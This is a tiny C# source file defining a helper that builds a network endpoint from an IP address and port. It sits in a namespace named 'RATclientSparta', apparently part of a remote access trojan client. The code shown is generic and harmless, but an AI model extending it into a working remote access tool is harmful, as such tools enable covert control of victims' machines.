﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace RATclientSparta.Socket
{
    public class EndPoint
    {
        public static IPEndPoint Set(string ipaddress, int port)
        {
            return new System.Net.IPEndPoint(IPAddress.Parse(ipaddress), port);
        }
    }
}
